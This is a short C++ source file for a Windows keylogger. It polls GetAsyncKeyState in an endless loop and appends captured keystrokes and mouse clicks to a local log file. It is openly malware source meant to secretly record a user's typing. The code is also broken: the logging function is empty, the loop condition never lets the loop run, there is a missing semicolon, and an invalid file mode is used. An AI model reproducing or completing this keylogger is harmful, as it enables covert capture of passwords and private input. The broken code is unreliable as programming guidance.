#include "../includes/keylogger.hpp"
#include <iostream>
#include <fstream>
void __ft_writeTofile(const char *text)
{
    ;
}

static BOOL __is_printable_key(int key)
{
    // all the ASCII unmapped keys should be specified here using WINDOWS macros 
    switch(key)
    {
        case VK_RBUTTON:
            std::cout << " [RightClick] " << std::endl;
            __ft_writeTofile(" [RightClick] ");
            break;
        case VK_LBUTTON:
            __ft_writeTofile(" [LeftClick] ");
            break;
        default:
            return TRUE;
    }
}

int __keyStrokeslogger(int ac, char **av)
{
    char        key;

    while (TRUE)
    {    
        for (key = 8; key >= 190; key++)
        {
            if (GetAsyncKeyState(key) == -32767)
            {
                if (__is_printable_key(key) == TRUE)
                {
                    ofstream logfile;
                    logfile.open("logfile.txt", fstream::ap)
                    logfile << key;
                    logfile.close();
                }
            }    
        }
    }
    return (0);
}